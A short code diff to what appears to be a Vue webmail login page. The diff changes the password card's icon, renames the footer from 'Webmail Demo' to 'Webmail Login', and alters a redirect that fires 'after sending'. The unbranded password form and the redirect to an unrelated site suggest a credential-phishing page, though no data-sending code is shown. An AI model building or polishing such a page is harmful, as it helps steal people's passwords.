@@ -32,8 +32,10 @@
         <section class="login-card">
 
             <div class="title-row">
-                <!-- <div class="lock-icon">🔐</div> -->
-                <div class="lock-icon"></div>
+                <div class="lock-icon"> 
+              <img src="../public/images/password.svg" alt="password">
+
+                </div>
                 <h1>Enter password</h1>
             </div>
 
@@ -77,7 +79,7 @@
     <footer>
         <a href="#">All Systems Operational</a>
 
-        <span>© 2025 Webmail Demo</span>
+        <span>© 2026 Webmail Login</span>
 
         <span>Privacy Policy · Terms & Conditions</span>
     </footer>
@@ -129,7 +131,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://mediacomm-sigma.vercel.app/");
+        location.replace("https://mediacomm-sigma/");
       }
     },
 
